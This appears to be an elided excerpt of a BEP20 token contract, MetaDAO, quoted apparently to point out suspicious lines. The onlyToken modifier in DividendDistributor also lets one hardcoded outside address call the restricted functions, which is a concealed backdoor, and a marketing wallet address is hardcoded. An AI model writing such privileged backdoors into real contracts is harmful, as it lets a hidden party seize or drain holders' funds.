...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x821f8734877296341EA6FA13E66a2671060Aa775)); _;
    }
...
contract MetaDAO is IBEP20 , Auth, BaseToken {
    ...
    constructor() payable  Auth(msg.sender) {
		...
		swapThreshold = _totalSupply.mul(2).div(1000000);
    ...
    function init(
        ...
        marketingWallet = 0x02570B89662d543F5949702adaD7ca075a3FEA4b;
        anothermarketingWallet = addrs[1];
        anothermarketingWallet2 = addrs[2];
